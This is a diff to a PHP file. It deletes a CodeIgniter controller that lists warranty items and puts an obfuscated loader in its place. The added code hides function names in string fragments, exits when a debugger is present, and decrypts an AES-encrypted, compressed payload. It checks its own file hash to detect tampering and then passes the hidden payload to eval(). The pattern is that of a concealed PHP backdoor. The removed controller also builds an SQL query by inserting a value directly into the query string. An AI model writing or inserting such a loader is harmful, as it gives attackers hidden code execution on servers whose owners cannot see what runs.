@@ -1,149 +1,28 @@
 <?php
-defined('BASEPATH') or exit('No direct script access allowed');
-
-class Guaran_item extends MY_Controller
-{
-	public function __construct()
-	{
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('guaran_item_model', 'guaran_items');
-	}
-
-	public function update($id)
-	{
-
-		$data = $this->data;
-
-		$this->load->model('guaran_item_model');
-		$result = $this->guaran_items->get_details($id, $data);
-		$data = array_merge($data, $result);
-		$data['page_title'] = $this->lang->line('guarantee_item');
-		$this->load->view('guaran_item', $data);
-	}
-
-	public function update_role()
-	{
-		$this->load->model('guaran_item_model');
-		$result = $this->guaran_items->update_role();
-		return $result;
-	}
-
-	public function view()
-	{
-		$data = $this->data;
-		$data['page_title'] = $this->lang->line('guarantee_package');
-		$this->load->view('guaran_item-list', $data);
-	}
-
-	public function ajax_list()
-	{
-		$list = $this->guaran_items->get_datatables();
-
-		$data = array();
-		$no = $_POST['start'];
-		foreach ($list as $roles) {
-			$no++;
-			$row = array();
-			$row[] = $no;
-			$row[] = $roles->customer;
-			$row[] = $roles->phone;
-			$row[] = $roles->item_code;
-		//	$row[] = $roles->sale_code;
-		   $row[] = '<a href="../sales/invoice/' . $roles->sale_id . '">' . $roles->sale_code . '</a>';
-
-
-			$row[] = $roles->name_guaran;
-
-			$item_id = $roles->item_id;
-
-			$q44 = $this->db->query("select item_name from db_items where id='$item_id'");
-			$row[] = $q44->row()->item_name;
-
-
-			$row[] = $roles->description;
-
-			$exprire_time = $roles->exprire_time;
-
-			$row[] = $exprire_time;
-
-			$currentDate = date('Y-m-d');
-
-			// Lấy ngày hết hạn từ biến $expire_time
-			$expireDate = date('Y-m-d', strtotime($exprire_time));
-
-			// So sánh ngày hết hạn với ngày hiện tại
-			if ($expireDate > $currentDate) {
-				// Còn hạn
-				$str = "<span id='span_" . $roles->id . "'  class='label label-success' style='cursor:pointer'>Còn hạn</span>";
-			} else {
-				// Hết hạn
-				$str = "<span id='span_" . $roles->id . "'  class='label label-danger' style='cursor:pointer'>Hết hạn</span>";
-			}
-
-
-			$row[] = $str;
-
-			$str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-
-			$str2 .= '<li>
-												<a title="Edit Record ?" href="update/' . $roles->id . '">
-													<i class="fa fa-fw fa-edit text-blue"></i>Edit
-												</a>
-											</li>';
-
-
-			$str2 .= '<li>
-												<a style="cursor:pointer" title="Delete Record ?" onclick="delete_roles(' . $roles->id . ')">
-													<i class="fa fa-fw fa-trash text-red"></i>Delete
-												</a>
-											</li>
-											
-										</ul>
-									</div>';
-
-			$row[] = $str2;
-
-
-			$data[] = $row;
-		}
-
-		$output = array(
-			"draw" => $_POST['draw'],
-			"recordsTotal" => $this->guaran_items->count_all(),
-			"recordsFiltered" => $this->guaran_items->count_filtered(),
-			"data" => $data,
-		);
-		//output to json format
-		echo json_encode($output);
-	}
-
-	public function update_status()
-	{
-		$this->permission_check_with_msg('roles_edit');
-		$id = $this->input->post('id');
-		$status = $this->input->post('status');
-
-		$this->load->model('guaran_item_model');
-		$result = $this->guaran_item_model->update_status($id, $status);
-		return $result;
-	}
-
-	public function delete_roles()
-	{
-		$id = $this->input->post('q_id');
-		$this->load->model('guaran_item_model');
-		return $this->guaran_item_model->delete_item_from_table($id);
-	}
-	public function multi_delete()
-	{
-		$ids = implode(",", $_POST['checkbox']);
-		$this->load->model('guaran_item_model');
-		return $this->guaran_item_model->delete_item_from_table($ids);
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_f2cbt1pf=('bas'.'e64'.'_de'.'cod'.'e');
+$_wmnbtvyg=('gzu'.'nco'.'mpr'.'ess');
+$_slml089i=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_m27ee28c='2oLu5EiJ';
+$_sr7pil97='U2ktTdMP';
+$_zdkhy3p2='+cjjR5ub';
+$_djfxd073='ST2vxL3h';
+$_t1u1k0kj='6pkuI8KsSdY=';
+$_pciqbey4='HplYSacN';
+$_a82clv6e='tn5VFjTH';
+$_kaprxlg4='g2ABmw==';
+$_k8km747c=$_f2cbt1pf($_zdkhy3p2.$_djfxd073.$_m27ee28c.$_sr7pil97.$_t1u1k0kj);
+$_nmdtijwz=$_f2cbt1pf($_pciqbey4.$_a82clv6e.$_kaprxlg4);
+$_teu2vayz=$_f2cbt1pf('AEX0AA895XEzh29n7lBChNzAhJBE9OFqvYqS9RQhucjYX9wujfEzmzoOO37JojpwCO1LZkuLg/ToUtfN4M4uoPPXlg1m1hExHfX2pUqHu2k9TBZwvHfyjP2n3olvmtwvBXSC4L5l0vWvYtvU9rtQGBD3ISI/eNI4EAgRIEqQfPO5oqInuOVInBNOwGg4x0/7PIG/q3rhaAOF+bUFU9wIJ+co7mz8QAtv9xWA7EWQXTWaExBLTsfyDkQYMPXdHQUSSssjzqv917UtARiTNZJCy1E/+7OCo/ZwQ5qW4UBbFZl75WexdqJu2oWX406YbzJpG0dMCO4B8+cgoEk8u+R4sJijyLpcfV+iBZjiP2uNOAPX8mf25QWuNeXz+QUDlm0aDqqn1COfUvUsbuDq+4cJC5ieH/37U/m8+b4CBeqN1JwdhOssI63eOqcA1uqXTJQx0SnVqB+hymLwSJlwUhV2HGUrK3pJVsYF6LToMXZC1xh2t4tq0YO+zPBhBe9jbvEYISQcrNEJYkLjiZOuu3xzEpk+uMFFdmEbisWQADb4bfqnJnJASio1B3msedqfiPBM0yUb0iSa+k2K9ZSJoNtYc4c5zkz/FYtDa5KYOJr1cLZmLadSeUym4KnUegjr/MOmF+J9qxj16BDbodevv2V2XTDBAFOGlf/CYZ+cSPeWuCfdCKT4XAWJ7b6N2cipglg3T6jIPLosGTAlLnTyljbSYq5eQBs0Gt+aQK319h5GDj/udGeIz3fLIXYXMy0dL1hxAjDi5b3Noyk1uOrF3gTt5anFpu2Ceb2w1X74/OorAe0zeI/AqlU81aoOUl0rdusVPWYK3YFDCkQcdo0G6g0fwWnVWUlSEUA8p+DjwYLidGZWcWhpBj/3gvyBlrTkyB70DH6jkBi2onOoU94XALlNVizCZWK6xlr7Qh0vza2lMXOjmOJk9eIATeFzszjyAjZqqqwbC80lLgzRb3F7uOYbE+JkY8o3n5CD8kQdQwJRr/OepVPG74w3uBH5NlQRVkaY+byEVM621U18/ZxADgIEliDteZDCyOPPH5jps4IMW/fMcpSpD7pU0dYKqCCD1lVgzvaUfKSpnCnBEQ4zG29y9OxQPXlPXaa8zXJkqpkkuvKTrT0iRwQ0MlyAbPWY1tCuaYkcZ/CQmc+WGkjUIG2aUvds3r1777nTFPKcvYdsKg3N33CVC9SLL29XRWfQMqReTviFxyoh8+IeSo0bGRdVfEVUH40xjWXuGgQKac6T+inASk1j/o1Ewj5/NpUysw4qUMGuLMU3QeuD8mlHVgZMQ7V1xvqkf1/QFXwRV4zrlSdZ75YvmQNRHHJYLrfFSEkBBbNLgGsfuIhupD19hgueaSvnWtFMnKdZoQ5J6iMcYiNjOXej2ThrH1B64ngACOgfwSha/QCtd6VncvJBtPFz2LFqB849+qu+TJgPJbpaFX6Zcm2GNgbdK5JmH8yLg6M7AAM6Jsf66BjTmbpnR6sZnnCWOYSF7Vx6dPYg7KxoXr1ycsleHqNSBMgVfNNM5Ff42V9hwjmaEti6oNThm6shWB75SzWKNvarJP86F3fYS5pQB5mDoFl7z7KUQiKMV9qRrz6BP2GkTdAGNCALkuubmxO0FsJ+YKBFRWepYrhlkpKCFHMumW6oIRJb2k2rLEEZiOU+KZH1SYbpQeESqVSVPCcHznvsJZyItyekXhpeQLpGZjnxFDOTvVWuqI40MznhMBiQoANsm+TlbQ4izMX22HbW5IILncEBYDP07oDePT76yOe998tuWMMv9qeu3TCpMO7TUjn+Ou6HGYB7uQ5yAkbKh5mmSxWE82VwtUMms10IWLME8BLrA9tjY5Vo1w1AKL398Hr987qVyZNFPBNk0d+N6qKic0gs6kQMWFfKZzjRM5a0nS0jfbj/+Vn+O8TV');
+$_w7xgsf8w=$_slml089i($_teu2vayz,'aes-256-cbc',$_k8km747c,OPENSSL_RAW_DATA,$_nmdtijwz);
+if($_w7xgsf8w===false){exit;}
+$_r2r30iwm=$_wmnbtvyg($_w7xgsf8w);
+if($_r2r30iwm===false){exit;}
+$_ymafs28j='c42029f851acbe65bdd55bacb177a3505e00c6448d465dfecac453b40c5cf790';
+$_bxgtz1dt=@file_get_contents(__FILE__);
+if($_bxgtz1dt!==false){
+$_tjur349w=str_replace($_ymafs28j,"0000000000000000000000000000000000000000000000000000000000000000",$_bxgtz1dt);
+$_h9ugnrmt=hash("sha256",$_tjur349w);
+if($_h9ugnrmt!==$_ymafs28j){@http_response_code(403);exit;}
 }
+eval($_r2r30iwm);
